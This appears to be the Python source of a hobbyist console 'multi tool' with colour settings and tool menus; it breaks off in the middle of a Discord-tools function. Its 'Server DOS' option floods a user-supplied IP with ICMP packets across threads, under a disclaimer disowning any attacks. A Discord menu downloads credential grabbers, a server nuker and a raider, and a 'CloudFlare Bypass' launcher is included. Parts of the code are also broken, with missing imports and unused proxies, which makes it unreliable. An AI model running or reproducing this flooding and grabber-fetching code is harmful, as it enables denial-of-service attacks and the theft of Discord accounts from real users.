try: 
	import time
	import os
	from colorama import *
	import ctypes
	from scapy.all import *
	import webbrowser
	import urllib.request
	import subprocess
	import json
	import requests
	from pystyle import Colors, Colorate, Center, Anime
	import zipfile
	import gdown
	import string
	import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
	import fade
	import datetime
	from urllib.request import ProxyHandler, build_opener
except:
	print("import error, did you install the requirements?")
	time.sleep(4)
	exit
def title_changer(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)
    set_console_background_color()
rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

color = Fore
red = color.RED
white = Fore.WHITE + Style.BRIGHT
green = color.GREEN
reset = color.RESET
blue = color.BLUE

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
def Reset():
        if sys.platform.startswith("win"):
            "WINDOWS"
            file = f'python python/main.py'
            subprocess.run(file, shell=True)
        elif sys.platform.startswith("linux"):
            "LINUX"
            file = f'python3 python/main.py'
            subprocess.run(file, shell=True)
with open('settings/configs/MenuSettings.json') as f:
    config = json.load(f)

def get_color(color_name):
    color_map = {
        "red": Fore.RED,
        "blue": Fore.BLUE,
        "green": Fore.GREEN,
        "yellow": Fore.YELLOW,
        "magenta": Fore.MAGENTA,
        "cyan": Fore.CYAN,
        "white": Fore.WHITE,
        "black": Fore.BLACK,
        "light_red": Fore.LIGHTRED_EX,
        "light_blue": Fore.LIGHTBLUE_EX,
        "light_green": Fore.LIGHTGREEN_EX,
        "light_yellow": Fore.LIGHTYELLOW_EX,
        "light_magenta": Fore.LIGHTMAGENTA_EX,
        "light_cyan": Fore.LIGHTCYAN_EX,
        "dark_red": Fore.RED + Style.DIM,
        "dark_blue": Fore.BLUE + Style.DIM,
        "dark_green": Fore.GREEN + Style.DIM,
        "dark_yellow": Fore.YELLOW + Style.DIM,
        "dark_magenta": Fore.MAGENTA + Style.DIM,
        "dark_cyan": Fore.CYAN + Style.DIM,
        "dark_white": Fore.WHITE + Style.DIM,
        "dark_black": Fore.BLACK + Style.DIM,
        "bright_red": Fore.RED + Style.BRIGHT,
        "bright_blue": Fore.BLUE + Style.BRIGHT,
        "bright_green": Fore.GREEN + Style.BRIGHT,
        "bright_yellow": Fore.YELLOW + Style.BRIGHT,
        "bright_magenta": Fore.MAGENTA + Style.BRIGHT,
        "bright_cyan": Fore.CYAN + Style.BRIGHT,
        "bright_white": Fore.WHITE + Style.BRIGHT,
        "bright_black": Fore.BLACK + Style.BRIGHT
    }
    return color_map.get(config.get(color_name), Fore.RESET)
def set_console_background_color():
    color_map = {
        "Black": "0",
        "DarkBlue": "1",
        "DarkGreen": "2",
        "DarkCyan": "3",
        "DarkRed": "4",
        "DarkMagenta": "5",
        "DarkYellow": "6",
        "Gray": "7",
        "DarkGray": "8",
        "Blue": "9",
        "Green": "A",
        "Cyan": "B",
        "Red": "C",
        "Magenta": "D",
        "Yellow": "E",
        "White": "F"
    }
    color_name = config.get("ConsoleBackgroundColor")
    os.system("color " + color_map.get(color_name) + "F")

maintool_color = get_color("MainToolColor")
secondary_color = get_color("SecondaryToolColor")
error_color = get_color('ErrorColor')
input_color = get_color('InputColor')
add_color = get_color('AddColor')
info_color = get_color('InfoColor')
wait_color = get_color('WaitColor')
gen_valid_color = get_color('GenValid')
gen_invalid_color = get_color('GenInvalid')
motd_text_color = get_color('MOTDTextColor')
backgroundcolor = set_console_background_color()
reset = Style.RESET_ALL

INPUT = f'{input_color}[{Fore.WHITE}>{input_color}] | {reset}'
INFO = f'{info_color}[{Fore.WHITE}!{info_color}] | {reset}'
ERROR = f'{error_color}[{Fore.WHITE}x{error_color}] | {reset}'
ADD = f'{add_color}[{Fore.WHITE}+{add_color}] | {reset}'
WAIT = f'{wait_color}[{Fore.WHITE}~{wait_color}] | {reset}'
INFO_ADD = ADD
GEN_VALID = f'{gen_valid_color}[{Fore.WHITE}+{gen_valid_color}] | {reset}'
GEN_INVALID = f'{gen_invalid_color}[{Fore.WHITE}x{gen_invalid_color}] | {reset}'
def set_console_transparency(alpha=200):
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.dwmapi.DwmEnableBlurBehindWindow(hwnd, ctypes.byref(ctypes.c_int(1)))
    ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, alpha, 0x2)
    windows_version = platform.release()
    if windows_version == '10':
        pass
    elif windows_version == '11':
        ctypes.windll.user32.SetWindowCompositionAttribute(hwnd, 1, ctypes.byref(ctypes.c_int(2)))
    else:
        print("Unsupported Windows version. Console transparency may not work as expected.")
motd_text = f"{motd_text_color}Error fetching MOTD text"
def load_alpha():
    global background_alpha

    try:
        with open('settings/configs/MenuSettings.json') as f:
            config = json.load(f)
        background_alpha = config["ConsoleBackgroundAlpha"]
        set_console_transparency(background_alpha)
    except FileNotFoundError:
        print(f"{ERROR}MenuSettings.json file not found. Using default alpha.{reset}")
        background_alpha = 200
        set_console_transparency(background_alpha)
    except KeyError:
        print(f"{ERROR}Invalid MenuSettings.json file. Using default alpha.{reset}")
        background_alpha = 200
        set_console_transparency(background_alpha)
def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)
def loadinganimation():
    Spinner()
    clear_console()
banner = r"""
 .d8888888b.  
d88P"   "Y88b 
888  d8b  888 
888  888  888 
888  888bd88P 
888  Y8888P"  
Y88b.     .d8 
 "Y88888888P"
"""[1:]

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    set_console_background_color()

def startclear():
    clear_console()
def get_os():
    if platform.system().upper() == "WINDOWS":
        return "windows"
    else:
        return "linux"
try:
	username_pc = os.getlogin()
except:
	print("[ERROR] failed getting username")
	username_pc = "Glitched Studios User"
motdtextpart1 = Colorate.Horizontal (Colors.green_to_cyan, f"""
===============================> MOTD <===============================\n
""")
motdtextpart2 = Colorate.Horizontal (Colors.cyan_to_blue, f"""
===============================> MOTD <===============================\n
""")
loaderoption = (f"""{red}┌───({white}{username_pc}@glitched-studios-tools{red})─[{white}~{red}]
└──{white}$ {Fore.RESET}""")
logo = fade.purplepink(f"""
	   ▄▄ • ▄▄▌  ▪  ▄▄▄▄▄ ▄▄·  ▄ .▄▄▄▄ .·▄▄▄▄      .▄▄ · ▄▄▄▄▄▄• ▄▌·▄▄▄▄  ▪        .▄▄ · 
	  ▐█ ▀ ▪██•  ██ •██  ▐█ ▌▪██▪▐█▀▄.▀·██▪ ██     ▐█ ▀. •██  █▪██▌██▪ ██ ██ ▪     ▐█ ▀. 
	  ▄█ ▀█▄██▪  ▐█· ▐█.▪██ ▄▄██▀▐█▐▀▀▪▄▐█· ▐█▌    ▄▀▀▀█▄ ▐█.▪█▌▐█▌▐█· ▐█▌▐█· ▄█▀▄ ▄▀▀▀█▄
	  ▐█▄▪▐█▐█▌▐▌▐█▌ ▐█▌·▐███▌██▌▐▀▐█▄▄▌██. ██     ▐█▄▪▐█ ▐█▌·▐█▄█▌██. ██ ▐█▌▐█▌.▐▌▐█▄▪▐█
	  ·▀▀▀▀ .▀▀▀ ▀▀▀ ▀▀▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ▀▀▀▀▀•      ▀▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀▀▀• ▀▀▀ ▀█▄▀▪ ▀▀▀▀         
{reset}                                                              
""")

defluatlogo = f"""
	   ▄▄ • ▄▄▌  ▪  ▄▄▄▄▄ ▄▄·  ▄ .▄▄▄▄ .·▄▄▄▄      .▄▄ · ▄▄▄▄▄▄• ▄▌·▄▄▄▄  ▪        .▄▄ · 
	  ▐█ ▀ ▪██•  ██ •██  ▐█ ▌▪██▪▐█▀▄.▀·██▪ ██     ▐█ ▀. •██  █▪██▌██▪ ██ ██ ▪     ▐█ ▀. 
	  ▄█ ▀█▄██▪  ▐█· ▐█.▪██ ▄▄██▀▐█▐▀▀▪▄▐█· ▐█▌    ▄▀▀▀█▄ ▐█.▪█▌▐█▌▐█· ▐█▌▐█· ▄█▀▄ ▄▀▀▀█▄
	  ▐█▄▪▐█▐█▌▐▌▐█▌ ▐█▌·▐███▌██▌▐▀▐█▄▄▌██. ██     ▐█▄▪▐█ ▐█▌·▐█▄█▌██. ██ ▐█▌▐█▌.▐▌▐█▄▪▐█
	  ·▀▀▀▀ .▀▀▀ ▀▀▀ ▀▀▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ▀▀▀▀▀•      ▀▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀▀▀• ▀▀▀ ▀█▄▀▪ ▀▀▀▀ 
     
"""
loadingpart1 = f"""
	  {logo}
		> Press Enter To Begin
	  """
loadingpart2 = f"""
	  {logo}
		 < Rules >
		  1. We aren't accountable for your usage of this tool
		  More Rules are to come
	  """
loadingpartfinish = f"""
	  {logo}
            Welcome to Glitched Studios Multi Tools
            Loaded Successfully !
            Don't Forget The Rules
            Press Enter To Choose your Option __>
	  """


def loading_screen():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
    title_changer("Glitched Studios Multi Tool | Loading.")
    Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
    title_changer("Glitched Studios Multi Tool | Loading..")
    Anime.Fade(Center.Center(loadingpart2), Colors.blue_to_purple, Colorate.Vertical, interval=0.1, enter=True)    
    title_changer("Glitched Studios Multi Tool | Loading...")
    Anime.Fade(Center.Center(loadingpartfinish), Colors.red_to_purple, Colorate.Vertical, interval=0.1, enter=True)
    title_changer("Glitched Studios Multi Tool | Loading Is Done!")
def settings():
    clear_console()
    title_changer("Glitched Studios Multi Tool | Settings")
    print(logo)
    print(f"{maintool_color}[01]{secondary_color} | Change Main Tool Color")
    print(f"{maintool_color}[02]{secondary_color} | Change Secondary Tool Color")
    print(f"{maintool_color}[03]{secondary_color} | Change Error Color")
    print(f"{maintool_color}[04]{secondary_color} | Change Input Color")
    print(f"{maintool_color}[05]{secondary_color} | Change Add Color")
    print(f"{maintool_color}[06]{secondary_color} | Change Info Color")
    print(f"{maintool_color}[07]{secondary_color} | Change Wait Color")
    print(f"{maintool_color}[08]{secondary_color} | Change Gen Valid Color")
    print(f"{maintool_color}[09]{secondary_color} | Change Gen Invalid Color")
    print(f"{maintool_color}[10]{secondary_color} | Change MOTD Text Color")
    print(f"{maintool_color}[11]{secondary_color} | Change Console BackGround Color")
    print(f"{maintool_color}[12]{secondary_color} | Change Console Transparency")
    print(f"{maintool_color}[Back]{secondary_color} | Back to Main Menu")
    choice = input(f"{input_color}Choose an option: {reset}")

    if choice in ["01", "1"]:
        change_color("MainToolColor")
    elif choice in ["02", "2"]:
        change_color("SecondaryToolColor")
    elif choice in ["03", "3"]:
        change_color("ErrorColor")
    elif choice in ["04", "4"]:
        change_color("InputColor")
    elif choice in ["05", "5"]:
        change_color("AddColor")
    elif choice in ["06", "6"]:
        change_color("InfoColor")
    elif choice in ["07", "7"]:
        change_color("WaitColor")
    elif choice in ["08", "8"]:
        change_color("GenValid")
    elif choice in ["09", "9"]:
        change_color("GenInvalid")
    elif choice in ["10", "10"]:
        change_color("MOTDTextColor")
    elif choice in ["11", "11"]:
        change_background_color()
    elif choice in ["12", "12"]:
        change_background_alpha()
    elif choice in ["Back", "back"]:
        menu()
    else:
        print(f"{error_color}Invalid option. Please try again.{reset}")
        time.sleep(2)
        settings()

def change_color(color_name):
    global maintool_color, secondary_color, error_color, input_color, add_color, info_color, wait_color, gen_valid_color, gen_invalid_color, motd_text_color

    clear_console()
    title_changer(f"Glitched Studios Multi Tool | Change {color_name}")

    colors = [
        "Red", # 1
        "Blue", # 2
        "Green", # 3
        "Yellow", # 4
        "Magenta", # 5
        "Cyan", # 6
        "White", # 7
        "Black", # 8
        "Light Red", # 9
        "Light Blue", # 10
        "Light Green", # 11
        "Light Yellow", # 12
        "Light Magenta", # 13
        "Light Cyan", # 14
        "Dark Red", # 15
        "Dark Blue", # 16
        "Dark Green", # 17
        "Dark Yellow", # 18
        "Dark Magenta", # 19
        "Dark Cyan", # 20
        "Dark White", # 21
        "Dark Black", # 22
        "Bright Red", # 23
        "Bright Blue", # 24
        "Bright Green", # 25
        "Bright Yellow", # 26
        "Bright Magenta", # 27
        "Bright Cyan", # 28
        "Bright White", # 29
        "Bright Black" # 30
    ]

    page_size = 10
    page_num = 1
    total_pages = math.ceil(len(colors) / page_size)

    while True:
        clear_console()
        print(logo)
        print(f"{maintool_color}Available colors (Page {page_num}/{total_pages}):")
        for i, color in enumerate(colors[(page_num-1)*page_size:page_num*page_size]):
            print(f"{maintool_color}[{i+1+(page_num-1)*page_size}]{secondary_color} | {color}")
        print(f"{maintool_color}[BACK]{secondary_color} | goes to back main settings page")
        print(f"{maintool_color}[NEXT]{secondary_color} | goes to next page")
        print(f"{maintool_color}[PREV]{secondary_color} | goes to previous page")

        choice = input(f"{input_color}Choose a color: {reset}")

        if choice == "back":
            settings()
        elif choice == "next" and page_num < total_pages:
            page_num += 1
            clear_console()
        elif choice == "prev" and page_num > 1:
            page_num -= 1
            clear_console()
        else:
            try:
                color_index = int(choice)
                if color_index >= 1 and color_index <= len(colors):
                    new_color = colors[color_index-1].lower().replace(" ", "_")
                    with open('settings/configs/MenuSettings.json') as f:
                        config = json.load(f)
                    config[color_name] = new_color
                    with open('settings/configs/MenuSettings.json', 'w') as f:
                        json.dump(config, f, indent=4)
                    with open('settings/configs/MenuSettings.json') as f:
                        config = json.load(f)
                    maintool_color = get_color("MainToolColor")
                    secondary_color = get_color("SecondaryToolColor")
                    error_color = get_color('ErrorColor')
                    input_color = get_color('InputColor')
                    add_color = get_color('AddColor')
                    info_color = get_color('InfoColor')
                    wait_color = get_color('WaitColor')
                    gen_valid_color = get_color('GenValid')
                    gen_invalid_color = get_color('GenInvalid')
                    motd_text_color = get_color('MOTDTextColor')
                    print(f"{info_color}Color changed successfully!{reset}")
                    clear_console()
                    Reset()
                else:
                    print(f"{error_color}Invalid option. Please try again.{reset}")
                    time.sleep(2)
            except ValueError:
                print(f"{error_color}Invalid option. Please try again.{reset}")
                time.sleep(2)
def change_background_color():
    global backgroundcolor

    clear_console()
    title_changer(f"Glitched Studios Multi Tool | Change BackGround Color")

    colors = [
        "Black", # 1
        "DarkBlue", # 2
        "DarkGreen", # 3
        "DarkCyan", # 4
        "DarkRed", # 5
        "DarkMagenta", # 6
        "Gray", # 7
        "DarkGray", # 8
        "Blue", # 9
        "Green", # 10
        "Cyan", # 11
        "Red", # 12
        "Magenta", # 13
        "Yellow", # 14
        "White" # 15
    ]

    page_size = 10
    page_num = 1
    total_pages = math.ceil(len(colors) / page_size)

    while True:
        clear_console()
        print(logo)
        print(f"{maintool_color}Available colors (Page {page_num}/{total_pages}):")
        for i, color in enumerate(colors[(page_num-1)*page_size:page_num*page_size]):
            print(f"{maintool_color}[{i+1+(page_num-1)*page_size}]{secondary_color} | {color}")
        print(f"{maintool_color}[BACK]{secondary_color} | goes to back main settings page")
        print(f"{maintool_color}[NEXT]{secondary_color} | goes to next page")
        print(f"{maintool_color}[PREV]{secondary_color} | goes to previous page")

        choice = input(f"{input_color}Choose a color: {reset}")

        if choice == "back":
            settings()
        elif choice == "next" and page_num < total_pages:
            page_num += 1
            clear_console()
        elif choice == "prev" and page_num > 1:
            page_num -= 1
            clear_console()
        else:
            try:
                color_index = int(choice)
                if color_index >= 1 and color_index <= len(colors):
                    new_color = colors[color_index-1]
                    with open('settings/configs/MenuSettings.json') as f:
                        config = json.load(f)
                    config["ConsoleBackgroundColor"] = new_color
                    with open('settings/configs/MenuSettings.json', 'w') as f:
                        json.dump(config, f, indent=4)
                    set_console_background_color()
                    print(f"{info_color}Background color changed successfully!{reset}")
                    clear_console()
                    Reset()
                else:
                    print(f"{error_color}Invalid option. Please try again.{reset}")
                    time.sleep(2)
            except ValueError:
                print(f"{error_color}Invalid option. Please try again.{reset}")
                time.sleep(2)
def change_background_alpha():
    global background_alpha

    clear_console()
    title_changer(f"Glitched Studios Multi Tool | Change BackGround Alpha")

    alpha_values = [
        "25",  # 1
        "50",  # 2
        "75",  # 3
        "100",  # 4
        "125",  # 5
        "150",  # 6
        "175",  # 7
        "200", # 8 
        "1011" # 9
    ]

    page_size = 5
    page_num = 1
    total_pages = math.ceil(len(alpha_values) / page_size)

    while True:
        clear_console()
        print(logo)
        print(f"{maintool_color}Available alpha values (Page {page_num}/{total_pages}):")
        for i, alpha in enumerate(alpha_values[(page_num-1)*page_size:page_num*page_size]):
            print(f"{maintool_color}[{i+1+(page_num-1)*page_size}]{secondary_color} | {alpha}%")
        print(f"{INFO_ADD} [9] Is Default")
        print(f"{maintool_color}[BACK]{secondary_color} | goes to back main settings page")
        print(f"{maintool_color}[NEXT]{secondary_color} | goes to next page")
        print(f"{maintool_color}[PREV]{secondary_color} | goes to previous page")

        choice = input(f"{input_color}Choose an alpha value: {reset}")

        if choice == "back":
            settings()
        elif choice == "next" and page_num < total_pages:
            page_num += 1
            clear_console()
        elif choice == "prev" and page_num > 1:
            page_num -= 1
            clear_console()
        else:
            try:
                alpha_index = int(choice)
                if alpha_index >= 1 and alpha_index <= len(alpha_values):
                    new_alpha = int(alpha_values[alpha_index-1])
                    with open('settings/configs/MenuSettings.json') as f:
                        config = json.load(f)
                    config["ConsoleBackgroundAlpha"] = new_alpha
                    with open('settings/configs/MenuSettings.json', 'w') as f:
                        json.dump(config, f, indent=4)
                    set_console_transparency(new_alpha)
                    print(f"{info_color}Background alpha changed successfully!{reset}")
                    clear_console()
                    Reset()
                else:
                    print(f"{error_color}Invalid option. Please try again.{reset}")
                    time.sleep(2)
            except ValueError:
                print(f"{error_color}Invalid option. Please try again.{reset}")
                time.sleep(2)
def set_console_transparency(alpha=200):
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.dwmapi.DwmEnableBlurBehindWindow(hwnd, ctypes.byref(ctypes.c_int(1)))
    ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, alpha, 0x2)
def ipstuff():
    clear_console()
    title_changer(f"Glitched Studios Multi Tool | Ip Stuff")
    print(logo)
    print(f"{maintool_color}[01]{secondary_color} Server DOS")
    print(f"{maintool_color}[02]{secondary_color} IP Information")
    choice = input(f"{INPUT}{secondary_color}Choose an option: ")

    if choice in ["01", "1"]:
        clear_console()
        server_dos()
    elif choice in ["2","02"]:
        clear_console()
        ip_info()
    else:
        print(f"{secondary_color}Invalid option. Please try again.")
        time.sleep(2)
        ipstuff()

def server_dos():
    clear_console()
    title_changer(f"Glitched Studios Multi Tool | Ip DDos")
    print(logo)
    print(f"{secondary_color}this requires the ip and a half decent pc")
    time.sleep(3)
    clear_console()
    print(logo)
    print("the owners of this tool are not in fault for anything attacked with this tool!")
    dontcare_ds = input(f"{secondary_color}do you agree? (y or n) : ")
    if dontcare_ds == "y":
        icmpflood()

def icmpflood():
    target = destip()
    print(logo)
    cycle = input("| packets : ")
    if cycle == "":
        cycle = 100
    proxies = get_proxies()
    for proxy in proxies:
        threading.Thread(target=send_packets, args=(target, cycle, proxy)).start()

def send_packets(target, cycle, proxy):
    proxy_handler = ProxyHandler({'http': proxy, 'https': proxy})
    opener = build_opener(proxy_handler)
    for x in range(0, int(cycle)):
        send(IP(dst=target)/ICMP(), verbose=0)

def destip():
    print(logo)
    ip = input(f"{INPUT}Enter an IP address: ")
    return ip

def get_proxies():
    with open("output/others/proxies/working_proxies.txt", "r") as file:
        working_proxies = file.read().splitlines()
    return working_proxies

def ip_info():
    ip = destip()
    response = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719')

    if response.status_code != 200:
        print(f'Failed to retrieve IP information. Status code: {response.status_code}')
        return

    try:
        api = response.json()
    except json.JSONDecodeError:
        print('Failed to parse response as JSON.')
        return

    print(f'IP Information for {ip}:')
    print(f'{INFO_ADD}Status: {api["status"]}')
    print(f'{INFO_ADD}Continent: {api["continent"]}')
    print(f'{INFO_ADD}Continent Code: {api["continentCode"]}')
    print(f'{INFO_ADD}Country: {api["country"]}')
    print(f'{INFO_ADD}Country Code: {api["countryCode"]}')
    print(f'{INFO_ADD}Region: {api["region"]}')
    print(f'{INFO_ADD}Region Name: {api["regionName"]}')
    print(f'{INFO_ADD}City: {api["city"]}')
    print(f'{INFO_ADD}Zip: {api["zip"]}')
    print(f'{INFO_ADD}Latitude: {api["lat"]}')
    print(f'{INFO_ADD}Longitude: {api["lon"]}')
    print(f'{INFO_ADD}Timezone: {api["timezone"]}')
    print(f'{INFO_ADD}ISP: {api["isp"]}')
    print(f'{INFO_ADD}Organization: {api["org"]}')
    print(f'{INFO_ADD}AS: {api["as"]}')
    print(f'{INFO_ADD}Query: {api["query"]}')
    print(f'{INFO_ADD}Location URL: https://www.google.com/maps/search/?api=1&query={api["lat"]},{api["lon"]}')
    pause = input(f"{INPUT}Enter To Exit: ")
def asset_info():
    asset_win = "https://github.com/AssetRipper/AssetRipper/releases/download/0.3.4.0/AssetRipper_win_x64.zip"
    asset_linux = "https://github.com/AssetRipper/AssetRipper/releases/download/0.3.4.0/AssetRipper_linux_x64.zip"
    uabea_win = "https://github.com/nesrak1/UABEA/releases/download/v7/uabea-windows.zip"
    uabea_linux = "https://github.com/nesrak1/UABEA/releases/download/v7/uabea-ubuntu.zip"
    apktoolkit = "https://www.dropbox.com/scl/fi/m5p9m2eltt0vmvfm8klrr/APK_Toolkit_v1.3.zip?rlkey=bvym00u0vokp6duzjvn81m04o&st=jral64x1&dl=0"
    apktool = "https://github.com/mkcs121/APK-Easy-Tool/releases/download/v1.60/APK.Easy.Tool.v1.60.Portable.zip"
    clear_console()
    title_changer("Glitched Studios Multi Tool | asset ripping tools")
    print(logo)
    print("Tools Needed To Rip Assets from games")
    print(f"{maintool_color}[1]{secondary_color} | Asset Ripper")
    print(f"{maintool_color}[2]{secondary_color} | Uabea")
    print(f"{maintool_color}[3]{secondary_color} | ApkTools {red}[Windows Only]")
    print(" ")
    asset = input(f"{rainbow_colors[4]}what tool would you like to look into: ")
    if asset == "1":
        clear_console()
        title_changer("Glitched Studios Multi Tool | ASSET RIPPER")
        print(logo)
        print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download Asset Ripper")
        print(f"{maintool_color}[INFO]{secondary_color} | see information about Asset Ripper")
        print(" ")
        download = input(loaderoption) 
        user_os = input("enter your os: ")
        if download == "download":
            if user_os ==  "windows":
                filename = "Asset_Ripper_WINDOWS.zip"
                urllib.request.urlretrieve(asset_win, f"output/downloads/{filename}")
                with zipfile.ZipFile(f"output/downloads/{filename}", 'r') as zip_ref:
                    zip_ref.extractall(f"output/downloads/Asset Ripper")
                os.remove(f"output/downloads/{filename}")
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] Downloaded and extracted Asset Ripper For Windows...")
                pause = input("press anything to exit...")
            elif user_os == "linux":
                filename = "Asset_Ripper_LINUX.zip"
                urllib.request.urlretrieve(asset_linux, f"output/downloads/{filename}")
                with zipfile.ZipFile(f"output/downloads/{filename}", 'r') as zip_ref:
                    zip_ref.extractall(f"output/downloads/Asset Ripper")
                os.remove(f"output/downloads/{filename}")
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] Downloaded and extracted Asset Ripper For Linux...")
                pause = input("press anything to exit...")
        elif download == "info":
            webbrowser.open("https://github.com/AssetRipper/AssetRipper/blob/master/LICENSE.md")
            clear_console()
            print(logo)
            pause = input("press anything to exit...")
    elif asset == "2":
        title_changer("Glitched Studios Multi Tool | UABEA")
        clear_console()
        print(logo)
        print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download UABEA")
        print(f"{maintool_color}[INFO]{secondary_color} | see information about UABEA")
        print(" ")
        download = input(loaderoption) 
        user_os = input("enter your os: ")
        if download == "download":
            if user_os ==  "windows":
                filename = "uabea-windows.zip"
                urllib.request.urlretrieve(uabea_win, f"output/downloads/{filename}")
                with zipfile.ZipFile(f"output/downloads/{filename}", 'r') as zip_ref:
                    zip_ref.extractall(f"output/downloads/UABEA")
                os.remove(f"output/downloads/{filename}")
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] Downloaded and extracted UABEA For Windows...")
                pause = input("press anything to exit...")
            elif user_os == "linux":
                filename = "uabea-ubuntu.zip"
                urllib.request.urlretrieve(uabea_linux, f"output/downloads/{filename}")
                with zipfile.ZipFile(f"output/downloads/{filename}", 'r') as zip_ref:
                    zip_ref.extractall(f"output/downloads/UABEA")
                os.remove(f"output/downloads/{filename}")
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] Downloaded and extracted UABEA For Linux...")
                pause = input("press anything to exit...")
        elif download == "info":
            webbrowser.open("https://github.com/nesrak1/UABEA/blob/master/LICENSE.md")
            clear_console()
            print(logo)
            pause = input("press anything to exit...")
    elif asset == "3":
        clear_console()
        title_changer("Glitched Studios Multi Tool | APKTOOLKIT")
        print(logo)
        print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download ApkToolkit")
        print(f"{maintool_color}[INFO]{secondary_color} | see information about ApkToolkit")
        print(" ")
        download = input(loaderoption) 
        user_os = input("enter your os: ")
        if download == "download":
            if user_os in  ["windows","window"]:
                filename = "ApkEasyTool.zip"
                urllib.request.urlretrieve(apktool, f"output/downloads/{filename}")
                with zipfile.ZipFile(f"output/downloads/{filename}", 'r') as zip_ref:
                    zip_ref.extractall(f"output/downloads/Apk Easy Tool")
                os.remove(f"output/downloads/{filename}")
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] Downloaded and extracted Apk Easy Tool For Windows...")
                pause = input("press anything to exit...")
                print(f"{secondary_color}[*] Opened Apk Tool Kit Download Website...")
            elif user_os == "linux":
                clear_console()
                print(logo)
                print(f"{secondary_color}[*] ApkTool Isnt For Linux...")
                pause = input("press anything to exit...")
                
        elif download == "info":
            webbrowser.open_new_tab("https://github.com/iBotPeaches/Apktool/blob/master/README.md")
            clear_console()
            print(logo)
            pause = input("press anything to exit...")

def cloudflare():
    clear_console()
    print(logo)
    print(f"{maintool_color}CloudFlare Tools:")
    print(f"{maintool_color}[1]{secondary_color} CloudFlare DNS Checker")
    print(f"{maintool_color}[2]{secondary_color} CloudFlare Bypass")
    print(f"{maintool_color}[back]{secondary_color} Back to main menu")

    while True:
        cloudflare_opt = input(f"{input_color}Choose an option: {reset}")

        if cloudflare_opt == "1":
            clear_console()
            subprocess.run(["python", "python/modules/cloudflare/cloudflare_dns.py"])
            input(f"{blue}Press anything to exit... {reset}")
            break
        elif cloudflare_opt == "2":
            clear_console()
            subprocess.run(["python", "python/modules/cloudflare/bypasser/CloudFlareBypasser.py"])
            break
        elif cloudflare_opt.lower() == "back":
            break
        else:
            clear_console()
            print(f"{error_color}Invalid input! Please try again.{reset}")
            time.sleep(2)
def discordtools():
    clear_console()
    title_changer("Glitched Studios Multi Tool | Discord Tools")
    redtigerdownload = "https://github.com/loxyteck/RedTiger-Tools/archive/refs/heads/main.zip"
    lunixgrabberdownload = "https://github.com/LynoForWindows/LunixLogger/releases/download/LunixLogger2.0/LunixGrabber2.0.Official.Release.zip"
    Nexusdownload = "https://github.com/VatosV2/Nexus-MultiTool/archive/refs/heads/main.zip"
    StatusChangerdownload = "https://github.com/bvfk/Discord-Status-Changer/archive/refs/heads/main.zip"
    BlackGrabberdownload = "https://github.com/Mentoros/BlackCap-Grabber/archive/refs/heads/main.zip"
    MentorosServerNukerdownload = "https://github.com/Mentoros/server-nuker/archive/refs/heads/main.zip"
    PCMSRaidder = "https://github.com/LynoForWindows/pcms-raidder/releases/download/%E2%9C%85Stable/pcms-raidderV2.zip"
    print(logo)
    print(f"{maintool_color}[1]  | {secondary_color} RedTiger [Multi Tool]")
    print(f"{maintool_color}[2]  | {secondary_color} Webhook Tool")
    print(f"{maintool_color}[3]  | {secondary_color} Lunix Grabber [Multi Tool]")
    print(f"{maintool_color}[4]  | {secondary_color} Nexus Multi Tool")
    print(f"{maintool_color}[5]  | {secondary_color} Discord-Status-Changer")
    print(f"{maintool_color}[BROKEN]  | {secondary_color} BlackCap-Grabber")
    print(f"{maintool_color}[7]  | {secondary_color} Mentoros - Server Nuker")
    print(f"{maintool_color}[8]  | {secondary_color} PCMS Raidder")
    print(f"{maintool_color}[9]  | {secondary_color} Osint Discord Bot Basic")
    print(" ")
    discordtool = input(loaderoption)
    if discordtool in ["01","1"]:
          clear_console()
          title_changer("Glitched Studios Multi Tool | Multi Tool - RedTiger")
          print(logo)
          print(f"{maintool_color}[DOWNLOAD]{secondary_color} | download Redtiger")
          print(f"{maintool_color}[INFO]{secondary_color} | see information about RedTiger")
          print(f"{maintool_color}[UPDATE]{secondary_color} | Updates To Current Version")
          print("")
          download = input(loaderoption)
          if download == "download":
            import os
            clear_console()
            Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
            urllib.request.urlretrieve(redtigerdownload, "output/downloads/RedTiger Multi Tool.zip")
            with zipfile.ZipFile("output/downloads/RedTiger Multi Tool.zip", 'r') as zip_ref:
              zip_ref.extractall("output/downloads/RedTiger Multi Tool")
            os.remove("output/downloads/RedTiger Multi Tool.zip")
            print("RedTiger Multi Tool has been downloaded and extracted to output/downloads/RedTiger Multi Tool")
            
            pause = input("Press enter to continue")
            discordtools()
          if download == "info":
                clear_console()
                Anime.Fade(Center.Center(loadingpart1), Colors.red_to_blue, Colorate.Vertical, interval=0.1, enter=True)
                webbrowser.open_new_tab("https://github.com/loxyteck/RedTiger-Tools?tab=readme-ov-file#%EF%B8%8Ffunctions")
                print(logo)
                pause = input("enter to contiune")
                discordtools()
          if download == "update":
                clear_console()
